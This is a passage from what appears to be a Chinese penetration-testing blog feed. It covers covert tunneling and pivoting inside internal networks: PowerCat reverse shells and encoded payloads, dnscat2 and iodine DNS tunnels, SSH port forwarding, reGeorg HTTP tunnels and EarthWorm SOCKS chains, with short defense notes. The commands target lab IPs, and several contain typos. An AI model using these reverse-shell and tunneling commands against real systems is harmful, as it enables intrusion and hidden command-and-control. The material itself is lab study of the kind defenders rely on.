bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-l      监听模式</span><br><span class="line">-p      指定监听端口</span><br><span class="line">-e      指定启动进程的名称</span><br><span class="line">-v      显示详情</span><br><span class="line">-c      指定想要连接的 IP 地址</span><br><span class="line">-ep     返回 powershell</span><br><span class="line">-dns    使用 dns 通信</span><br><span class="line">-g      生成 payload</span><br><span class="line">-ge     生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload</span><br></pre></td></tr></table></figure><p><strong>正向连接</strong><br>Kali 上的 nc 连接到靶机<br><code>nc -v 192.168.220.142 4444</code></p><p>靶机开启监听，等待 Kali 连接<br><code>powercat -l -v -p 4444 -e cmd.exe</code></p><p><strong>反向连接</strong><br>Kali 上开启监听<br><code>nc -lvp 4444</code></p><p>靶机向 kali 发起连接<br><code>powercat -c 192.168.220.165 -p 4444 -e cmd.exe</code></p><p><strong>返回powershell</strong><br>攻击机上运行<br><code>powercat -l -v -p 4444</code></p><p>靶机上运行<br><code>powercat -c 192.168.220.165 -p 4444 -v -ep</code></p><p><strong>powercat生成payload</strong><br>用PowerCat生成的Pylod也有正向和反向之分，且可以对其进行编码。尝试生成一个简单的Payload,在攻击机中执行如下命令。<br><code>powercat -1 -p 8000 -e cmd -v -g &gt;&gt; shell.ps1</code></p><p>将生成的psl文件上传到靶机中并执行，然后在攻击机中执行如下命令,就可以获得一个反弹 Shell。<br><code>powercat -C 191.168.52.10 -P 8000 -V</code></p><p>如果想反弹PowerShell,可以执行如下命令。<br><code>powercat -1 -P 8000 -ep -V -g &gt;&gt; shell.ps1</code></p><p>用PowerCat也可以直接生成经过编码的Payload。在攻击机中执行如下命令，即可得到经过编码的Payload。<br><code>powercat -C 192.168.52.10 -P 9999 -ep -ge</code></p><p>继续在攻击机中执行如下命令，并将Payload在靶机执行<br><code>powercat -1 -p 9999 -V</code></p><p>虽然PowerCat的作者给出的说明是在PowerShell 2.0以上版本中就可以使用这个功能，但是根据测试，在PowerShell 4.0以下版本中使用这个功能时都会报错。</p><p><strong>建立dns隧道连接</strong><br>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。<br>在服务端上安装 dnscat ，以 kali 为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>命令运行完之后，执行以下命令开启服务端<br><code>ruby dnscat2.rb powercat -e open --no-cache</code></p><p>在靶机下，执行以下命令，建立 dns 隧道<br><code>powercat -c 192.168.220.165 -p 53 -dns powercat -e cmd.exe</code></p><p><strong>将PowerCat作为跳板</strong><br>测试环境为：</p><ul><li>kali 192.168.220.165</li><li>windows7 192.168.220.142&amp;&amp;192.168.52.10</li><li>win2008 192.168.52.30</li></ul><p>将 win7 作为跳板机，让 kali 通过 win7 连接到 win2008<br>在 win2008 中执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 4444 -e cmd.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">powercat -C -192.168.52.10 -p 8000 -v -e cmd.exe</span><br></pre></td></tr></table></figure><p>在 win7 中执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 5555 -r tcp:192.168.52.30:4444</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">powercat -1 -p 8000 -r dns:192.168.220.165::ttpowercat.test</span><br></pre></td></tr></table></figure><p>最后在 kali 下连接 win7</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -v 172.16.214.2 5555</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用DNS协议：</span></span><br><span class="line">ruby dnscat2.rb ttpowercat.test -e open --no-cache</span><br></pre></td></tr></table></figure><h1 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h1><p>应用层的隧道通信技术主要利用应用软件提供的端口来发送数据。常用的隧道协议有SSH、HTTP&#x2F;HTTPS和DNS。</p><h2 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h2><p>在内网中，几乎所有的Linux&#x2F;UNIX服务器和网络设备都支持SSH协议。<br>在一般情况下，SSH协议是被允许通过防火墙和边界设备的，所以经常被攻击者利用。<br>同时，SSH协议的传输过程是加密的，所以我们很难区分合法的SSH会话和攻击者利用其他网络建立的隧道。<br>攻击者使用SSH端口隧道突破防火墙的限制后，能够建立一些之前无法建立的TCP连接。</p><p>一个普通的SSH命令如下。<br><code>ssh root@192.168.1.1</code></p><p>创建SSH隧道的常用参数说明如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C：压缩传输，提高传输速度</span><br><span class="line">-f：将SSH传输转入后台执行，不占用当前的Shell</span><br><span class="line">-N：建立静默连接(建立了连接，但是看不到具体会话)</span><br><span class="line">-g：允许远程主机连接本地用于转发的端口</span><br><span class="line">-L：本地端口转发</span><br><span class="line">-R：远程端口转发</span><br><span class="line">-D：动态转发(SOCKS代理)</span><br><span class="line">-P：指定SSH端口</span><br></pre></td></tr></table></figure><h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p>实验环境<br><img src="/simg/tunnel_4.png" alt=" "></p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li><li>内网主机(win2003)：192.168.52.133</li></ul><p>以Web服务器192.168.220.145为跳板，将内网主机192.168.52.133 的3389端口映射到kali攻击机192.168.220.165的4444端口，再访问kali攻击机的4444端口，就可以访问192.168.52.133的3389端口了。</p><p>kali攻击机上执行如下命令，会要求输入Web服务器(跳板机)的密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 4444(VPS端口):192.168.52.133 (目标主机):80(目标端口) root@192.168.220.145(跳板机)</span><br></pre></td></tr></table></figure><p><img src="/simg/tunnel_5.png" alt=" "><br><img src="/simg/tunnel_6.png" alt=" "><br><img src="/simg/tunnel_7.png" alt=" "></p><p>SSH进程的本地端口映射可以将本地(客户机)的某个端口转发到远端指定机器的指定端口；本地端口转发则是在本地(客户机)监听一个端口，所有访问这个端口的数据都会通过SSH隧道传输到远端的对应端口。</p><h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p>实验环境：</p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li><li>内网主机(win2003)：192.168.52.133</li></ul><p>以Web服务器为跳板，将kali攻击机的3307端口的流量转发到内网主机的3389端口，然后访问kali攻击机的3307端口，就可以访问内网主机的3389端口了。</p><p>在Web服务器192.168.220.145上执行如下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3307(kali攻击机端口):192.168.52.133(目标主机):3389(目标端口) root@192.168.220.165(kali攻击机ip)</span><br></pre></td></tr></table></figure><p><img src="/simg/tunnel_8.png" alt=" "></p><p>在本地访问kali的3307端口，可以发现，已经与内网主机 的3389端口建立了连接<br><code>rdesktop 127.0.0.1:3307</code></p><p>本地转发是将远程主机(服务器)某个端口的数据转发到本地机器的指定端口。<br>远程端口转发则是在远程主机上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口。</p><h3 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h3><p>实验环境：</p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.140、192.168.52.137</li><li>内网主机(win2003)：192.168.52.133</li></ul><p>在kali攻击机上执行如下命令，建立一个动态的SOCKS 4&#x2F;5代理通道，输入Web服务器的密码。</p><p><code>ssh -CfNg -D 7000 root@192.168.220.140</code></p><p>接下来，在本地打开浏览器，设置网络代理。通过浏览器访问内网域控制器192.168.52.133<br>输入如下命令，查看本地7000端口是否已经连接。</p><p><code>netstat -tulnp 1 grep &quot;: 7000&quot;</code></p><p>动态端口映射就是建立一个SSH加密的SOCKS 4&#x2F;5代理通道。任何支持SOCKS 4&#x2F;5协议的程序都可以使用这个加密通道进行代理访问。</p><h3 id="防御SSH隧道攻击的思路"><a href="#防御SSH隧道攻击的思路" class="headerlink" title="防御SSH隧道攻击的思路"></a>防御SSH隧道攻击的思路</h3><p>SSH隧道之所以能被攻击者利用，主要是因为系统访问控制措施不够。在系统中配置SSH远程管理白名单，在ACL中限制只有特定的IP地址才能连接SSH，以及设置系统完全使用带外管理等方法，都可以避免这一问题。</p><p>如果没有足够的资源来建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问控制策略(从外部到内部；从内部到外部)。</p><h2 id="HTTP-x2F-HTTPS协议"><a href="#HTTP-x2F-HTTPS协议" class="headerlink" title="HTTP&#x2F;HTTPS协议"></a>HTTP&#x2F;HTTPS协议</h2><p>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg、meterpreter 、tunna等。</p><p>reGeorg是reDuh的升级版，主要功能是把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP协议的通信。reGeorg脚本的特征非常明显，很多杀毒软件都会对其进行查杀。</p><p>reGeorg 支持ASPX、PHP、JSP 等Web脚本，并特别提供了一个Tomeat5版本。</p><p>将脚本文件上传到目标服务器中，使用Kali Linux在本地访问远程服务器上的tunnel.jsp 文件。返回后，利用reGeorgSocksProxy.py脚本监听本地的9999端口，即可建立一个通信链路。</p><p>输入如下命令，查看本地端口，可以发现9999端口已经开启了。</p><p><code>python reGeorgSocksProxy.py -u http://192.168.220.140:8080/tunnel.jsp -p 9999</code></p><p>隧道正常工作之后，可以在本地Kali Linux机器上使用ProxyChains之类的工具，访问目标内网中的资源。</p><p>传统的Web服务器通常不会将本地的3389端口开放到公网，攻击者的暴力破解行为也很容易被传统的安全设备捕获。但是，如果使用HTTP隧道进行端口转发，不仅攻击者可以直接访问Web服务器的3389端口，而且暴力破解所产生的流量的特征也不明显。因此，在日常网络维护中，需要监控HTTP隧道的情况，及时发现问题。</p><h2 id="DNS协议-1"><a href="#DNS协议-1" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>DNS协议是一种请求&#x2F;应答协议，也是一种可用于应用层的隧道技术。虽然激增的DNS流量可能会被发现，但基于传统Socket隧道已经濒临淘汰及TCP、UDP通信大量被防御系统拦截的状况，DNS、ICMP、HTTP&#x2F;HTTPS 等难以被禁用的协议已成为攻击者控制隧道的主流渠道。</p><p>一方面，在网络世界中，DNS是一个必不可少的服务；另一方面，DNS报文本身具有穿透防火墙的能力。由于防火墙和入侵检测设备大都不会过滤DNS流量，也为DNS成为隐蔽信道创造了条件。越来越多的研究证明，DNS隧道在僵尸网络和APT攻击中扮演着重要的角色。</p><p>用于管理僵尸网络和进行APT攻击的服务器叫作C&amp;C服务器( Command and Control Server,命令及控制服务器)。C&amp;C节点分为两种，分别是C&amp;C服务端(攻击者)和C&amp;C客户端(被控制的计算机)。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。</p><p>正常网络之间的通信，都是在两台机器之间建立TCP连接后进行的。在进行数据通信时：如果目标是IP地址，可以直接发送报文；如果目标是域名，会先将域名解析成IP地址，再进行通信。两台机器建立连接后, C&amp;C服务端就可以将指令传递给C&amp;C客户端上的木马(后门)程序，让其受到控制。</p><p>内网中安装了各种软&#x2F;硬件防护设施来检查主机与外部网络的连接情况。很多厂商会收集C&amp;C服务端的域名、IP地址、URL等数据，帮助防火墙进行阻断操作。这样一来，C&amp;C通信就会被切断。于是，通过各种隧道技术实现C&amp;C通信的技术(特别是DNS隧道技术)出现了。</p><p>DNS隧道的工作原理很简单：在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠DNS协议即可进行数据包的交换。从DNS协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令。</p><p>在使用DNS隧道与外部进行通信时，从表面上看是没有接连外网的(内网网关没有转发IP数据包)，但实际上，内网的DNS服务器进行了中转操作。这就是DNS隧道的工作原理，简单地说，就是将其他协议封装在DNS协议中进行传输。</p><h3 id="查看DNS的连通性"><a href="#查看DNS的连通性" class="headerlink" title="查看DNS的连通性"></a>查看DNS的连通性</h3><p>首先，需要知道当前服务器是否允许通过内部DNS解析外部域名，也就是要测试DNS的连通性。</p><p>输入如下命令，查询当前内部域名及IP地址。<br><code>cat /etc/resolv.conf|grep -v &#39;#&#39;</code></p><p>输入如下命令，查看能否与内部DNS通信。可以看到，能够解析内部域名<br><code>nslookup ad.com</code></p><p>输入如下命令,查询能否通过内部DNS服务器解析外部域名。可以看到，能够通过内部DNS服务器解析外部域名，这意味着可以使用DNS隧道实现隐蔽通信。<br><code>nslookup baidu.com</code></p><h3 id="dnscat2"><a href="#dnscat2" class="headerlink" title="dnscat2"></a>dnscat2</h3><p>nscat2是一款开源软件。它使用DNS协议创建加密的C&amp;C通道，通过预共享密钥进行身份验证；使用Shell及DNS查询类型( TXT、MX、CNAME、A. AAAA),多个同时进行的会话类似于SSH中的隧道，dnscat2 是一个命令与控制工具。</p><p>使用dnscat2隧道的模式有两种，分别是直连模式和中继模式。</p><ul><li>直连模式：客户端直接向指定IP地址的DNS服务器发起DNS解析请求。</li><li>中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器。与直连模式相比，中继模式的速度较慢。</li></ul><p>如果目标内网放行所有的DNS请求，dnscat2 会使用直连模式，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以“dnscat”开头的，因此防火墙可以很容易地将直连模式的通信检测出来。</p><p>如果目标内网中的请求仅限于白名单服务器或者特定的域, dnscat2会使用中继模式来申请一个域名，并将运行dnscat2服务端的服务器指定为受信任的DNS服务器。</p><p>dnscat2通过DNS进行控制并执行命令。与同类工具相比，dnscat2 具有如下特点。</p><ul><li>支持多个会话。</li><li>流量加密。</li><li>使用密钥防止MiTM攻击。</li><li>在内存中直接执行PowerShell脚本。</li><li>隐蔽通信。</li></ul><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动</span></span><br><span class="line">sudo ruby./dnscat2.rb abc.com --secret=123456  <span class="comment"># abc.com 自定义DNS传输的域名；--secret 自定义连接密码</span></span><br><span class="line">sudo ruby./dnscat2.rb --dns host=127.0.0.1,port=533 --secret=123456  <span class="comment">#设置监听端口</span></span><br><span class="line">sudo ruby./dnscat2.rb abc.com --secret=123456 --security=open --no-cache   <span class="comment">#--security 规定了安全级别；--no-cache 禁止缓存</span></span><br></pre></td></tr></table></figure><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ <span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnscat --secret=123456 abc.com </span><br><span class="line">dnscat --dns server=&lt;your dnscat2 server ip&gt;,port=553 --secret=123456</span><br></pre></td></tr></table></figure><p>具体的使用方法看官方手册</p><h3 id="iodine"><a href="#iodine" class="headerlink" title="iodine"></a>iodine</h3><p>碘的原子序数为53，而这恰好是DNS的端口号，故该工具被命名为“iodine”</p><p>iodine可以通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。<br>iodine 是基于C语言开发的，分为服务端程序iodined 和客户端程序iodine。Kali Linux内置了iodine。<br>与同类工具相比，iodine 具有如下特点：</p><ul><li>不会对下行数据进行编码。</li><li>支持多平台，包括Linux、 BSD、Mac OS、Windows。</li><li>支持16个并发连接。</li><li>支持强制密码机制。</li><li>支持同网段隧道IP地址(不同于服务器一客户端网段)。</li><li>支持多种DNS记录类型。</li><li>提供了丰富的隧道质量检测措施。</li></ul><p>iodine支持直接转发和中继两种模式.<br>其原理是：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道连接，处于同一个局域网(可以通过ping命令通信)。<br>在客户端和服务端之间建立连接后，客户机上会多出一块名为“dns0”的虚拟网卡。</p><p>具体的使用方法看官方手册</p><h3 id="防御DNS隧道攻击的方法"><a href="#防御DNS隧道攻击的方法" class="headerlink" title="防御DNS隧道攻击的方法"></a>防御DNS隧道攻击的方法</h3><p>防御隧道攻击并非易事，特别是防御DNS隧道攻击。通过如下操作，能够防御常见的隧道攻击行为。</p><ul><li>禁止网络中的任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信。</li><li>虽然没有人会将TXT解析请求发送给DNS服务器，但是dnscat2和邮件服务器&#x2F;网关会这样做。因此，可以将邮件服务器&#x2F;网关列入白名单并阻止传入和传出流量中的TXT请求。</li><li>跟踪用户的DNS查询次数。如果达到阈值，就生成相应的报告。</li><li>阻止ICMP</li></ul><h1 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h1><p>常见的网络场景有如下三类。</p><ul><li>服务器在内网中，可以任意访问外部网络。</li><li>服务器在内网中，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接。</li><li>服务器在内网中，对外只开放了部分端口(例如80端口),且服务器不能访问外部网络。</li></ul><h2 id="常用的SOCKS代理工具"><a href="#常用的SOCKS代理工具" class="headerlink" title="常用的SOCKS代理工具"></a>常用的SOCKS代理工具</h2><p>SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。 SOCKS支持多种协议，包括HTTP、FTP等。SOCKS分为SOCKS 4和SOCKS 5两种类型：SOCKS 4只支持TCP协议；SOCKS 5不仅支持TCP&#x2F;UDP协议，还支持各种身份验证机制等,其标准端口为1080。SOCKS能够与目标内网计算机进行通信，避免多次使用端口转发。</p><p>SOCKS代理其实可理解为增强版的lcx。它在服务端监听一个服务端口，当有新的连接请求出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能。SOCKS代理工具有很多，在使用时要尽可能选择没有GUI界面的。此外，要尽量选择不需要安装其他依赖软件的SOCKS代理工具，能够支持多平台的工具更佳。</p><p>常用的SOCKS代理工具有：EarthWorm、reGeorg、sSocks、SocksCap64、Proxifier、ProxyChains</p><h2 id="SOCKS代理技术在网络环境中的应用"><a href="#SOCKS代理技术在网络环境中的应用" class="headerlink" title="SOCKS代理技术在网络环境中的应用"></a>SOCKS代理技术在网络环境中的应用</h2><h3 id="EarthWorm的应用"><a href="#EarthWorm的应用" class="headerlink" title="EarthWorm的应用"></a>EarthWorm的应用</h3><p>EW的使用也非常简单，共有六种命令格式，分别是ssocksd、rcsocks、 rssocks、 lcx_slave、lcx_listen、 lex_tran。 其中，用于普通网络环境的正向连接命令是ssocksd,用于反弹连接的命令是resocks、rssocks, 其他命令用于复杂网络环境的多级级联。</p><p>正向代理是指主动通过代理来访问目标机器，反向代理是指目标机器通过代理进行主动连接。</p><p>工具链接：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p><strong>测试环境：</strong><br><img src="/simg/tunnel_9.png" alt=" "></p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(win7)：192.168.220.143、192.168.52.10</li><li>内网主机(win2003)：192.168.52.20</li></ul><p>(1) 正向SOCKS 5服务器<br>以下命令适用于目标机器拥有一个外网IP地址的情况。<br><code>ew -s ssocksd -l 888</code><br>执行上述命令，即可架设一个端口为888的SOCKS代理。接下来，使用SocksCap64添加这个IP地址的代理即可。</p><p>(2) 反弹SOCKS 5服务器<br>目标机器没有公网IP地址的情况具体如下(使其可以访问内网资源)。<br>首先，将EW上传到kali攻击机中，执行如下命令。<br><code>ew -s rcsocks -l 1080 -e 888</code><br>该命令的意思是：在公网VPS上添加一个转接隧道，把1080端口收到的代理请求转发给888端口。然后，将EW上传到Web服务器中，执行如下命令。<br><code>ew -s rssocks -d 192.168.220.165 -e 888</code><br>该命令的意思是：在IP地址为192.168.220.143的服务器上启动SOCKS5服务，然后，反弹到192.168.220.165kail攻击机的888端口。<br><img src="/simg/tunnel_10.png" alt=" "></p><p>最后，可以在kali的命令行界面看到反弹成功。现在就可以通过访问192.168.220.165 kali攻击机的1080端口，使用在网络右侧IP地址为192.168.52.10的服务器上架设的SOCKS5代理服务了。</p><p>(3) 二级网络环境(a)</p><p><img src="/simg/tunnel_11.png" alt=" "></p><p>假设已经获得了A主机和B主机的控制权限。A主机配有两块网卡，一块能够连接外网，另一块(192.168.52.10)只能连接内网中的B主机，但无法访问内网中的其他资源。B主机可以访问内网资源，但无法访问外网。</p><p>首先，将EW上传到B主机中，利用ssocksd方式启动888端口的SOCKs代理，命令如下。<br><code>ew -s ssocksd -l 888</code></p><p>然后，将EW上传到A主机中，执行如下命令。<br><code>ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</code></p><p>该命令的意思是：将1080端口收到的代理请求转发给B主机的888端口。现在就可以通过访问A主机的外网1080端口使用在B主机上架设的SOCKS5代理了。</p><p>(4) 二级网络环境(b)<br><img src="/simg/tunnel_12.png" alt=" "><br>假设已经获得了A主机和B主机的控制权限。A主机既没有公网IP地址，也无法访向内网资源。B主机可以访问内网资源，但无法访问外网。</p><p>首先，将EW上传到kali攻击机中，把1080端口收到的代理请求转发给888端口，执行如下命令。<br><code>ew -s lcx_listen -l 10800 -e 888</code></p><p>该命令的意思是：在公网kali攻击机中添加转接隧道，将10800端口收到的代理请求转发给888端口。接着，将EW上传到B主机中，并利用ssocksd方式启动999端口的SOCKS代理，命令如下。<br><code>ew -s ssocksd -l 999</code></p><p>然后，将EW上传到A主机中，执行如下命令。<br><code>ew -s lcx_slave -d 192.168.220.165 -e 888 -f 192。168.52.10 -g 999</code></p><p>该命令的意思是：在A主机上利用lcx_slave方式，将攻击机的888端口和B主机的999端口连接起来。</p><p>(5) 三级网络环境<br><img src="/simg/tunnel_12.png" alt=" "><br>三级网络环境在渗透测试中比较少见，也比较复杂。测试环境为：右侧的内网A主机没有公网IP地址，但可以访问外网；B主机不能访问外网，但可以被A主机访问; C主机可被B主机访问，而且能够访问核心区域。</p><p>首先，将EW上传到kali攻击机中，把1080端口收到的代理请求转发给888端口，执行如下命令。<br><code>ew -s rcsocks -l 1080 -e 888 </code></p><p>在A主机上执行如下命令，将kali攻击机的888端口和B主机的999端口连接起来。<br><code>ew -s lcx_slave -d 192.168.220.165 -e 888 -f &lt;主机B IP地址&gt; -g 999</code></p><p>在B主机上执行如下命令，将999端口收到的代理请求转发给777端口。<br><code>ew -s lcx_listen -l 999 -e 777</code></p><p>在C主机上启动SOCKS5服务，并反弹到B主机的777端口上，命令如下。<br><code>ew -s rssocks -d &lt;主机B IP地址&gt; -e 777</code></p><p>现在就可以通过访问kali攻击机的1080 端口使用在C主机上架设的SOCKS 5代理了</p><h3 id="在Windows下使用SocksCap64实现内网漫游"><a href="#在Windows下使用SocksCap64实现内网漫游" class="headerlink" title="在Windows下使用SocksCap64实现内网漫游"></a>在Windows下使用SocksCap64实现内网漫游</h3><p>下载并安装SocksCap64, 以管理员权限打开程序。<br><img src="/simg/tunnel_14.png" alt=" "></p><p>SocksCap64的使用方法比较简单，单击“代理”按钮，添加一个代理，然后设置代理服务器：的IP地址和端口即可。设置完成后，可以单击界面上的闪电图标按钮，测试当前代理服务器是否可以连接。<br><img src="/simg/tunnel_15.png" alt=" "><br>选择浏览器，单击右键，在弹出的快捷菜单中单击“ 在代理隧道中运行选中程序”选项，就可以自由访问内网资源了。</p><h3 id="在Linux下使用ProxyChains实现内网漫游"><a href="#在Linux下使用ProxyChains实现内网漫游" class="headerlink" title="在Linux下使用ProxyChains实现内网漫游"></a>在Linux下使用ProxyChains实现内网漫游</h3><p>Kali Linux中预装了ProxyChains, 稍加配置就可以使用。打开终端，输入如下命令。<br><code>vi /etc/proxychains.conf</code></p><p>删除“dynamic_ chain” 前面的注释符“#”。来到窗口底部，把“127.0.0.1 9050”改成想要访问的端口的信息。<br><img src="/simg/tunnel_16.png" alt=" "></p><p>测试一下代理服务器是否能正常工作。在终端输入如下命令。<br><code>proxyresolv www.baidu.com</code></p><p>此时会显示“未找到命令”的提示信息。在终端输入如下命令。<br><code>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</code></p><p>再次测试代理服务器的工作是否正常。显示“OK”,表示代理服务器已经正常工作了。现在就可以访问内网了。先访问内网中的网站。在终端输入“proxychains firefox”命令，启动火狐浏览器。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/jiufang/p/16451976.html">内网渗透之隐藏通信隧道技术</a><br><a href="https://xz.aliyun.com/t/12498">网络隧道：突破内网的通行证</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;复习+学习。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="隧道通信" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Linux内网渗透之提权</title>
    <link href="http://example.com/2023/08/28/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83/"/>
    <id>http://example.com/2023/08/28/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8F%90%E6%9D%83/</id>
    <published>2023-08-27T16:00:00.000Z</published>
    <updated>2023-08-29T11:50:45.775Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Linux提权方式的复习与学习。</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>我们在 Linux 中特权升级的最终目标是获得root用户。</p><h1 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h1><p>通常我们在拥有一个webshell的时候，一般权限都是WEB容器权限，如在iis就是iis用户组权限，在apache就是apache权限，一般都是权限较低，均可执行一些普通命令，如查看当前用户，网络信息，ip信息等。如果我想进行内网渗透就必须将权限提权到最高，如系统权限超级管理员权限。</p><p>注意：没有在必要的情况下，不建议使用，因为会把目标机器搞的宕机</p><p>Linux利用内核漏洞一般包括三个环节：</p><ol><li>对目标系统进行信息收集，获取系统内核信息和版本信息。<br>查看发行版本:<br><code>cat /etc/issue</code><br><code>cat /etc/*-release</code><br><code>cat /etc/redhat-release</code><br><code>cat /proc/version</code><br>lsb_release -a</li></ol><p>查看内核版本信息:<br><code>uname -a</code></p><ol start="2"><li>获取EXP。<br>方法一：<br>利用Kali自带的searchsploit来搜索对应版本的exp：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit &lt;发行版本内核版本&gt;</span><br><span class="line">searchsploit -t Ubuntu 16.04 // -t 仅搜索漏洞标题</span><br><span class="line">searchsploit -s Ubuntu 16.04</span><br><span 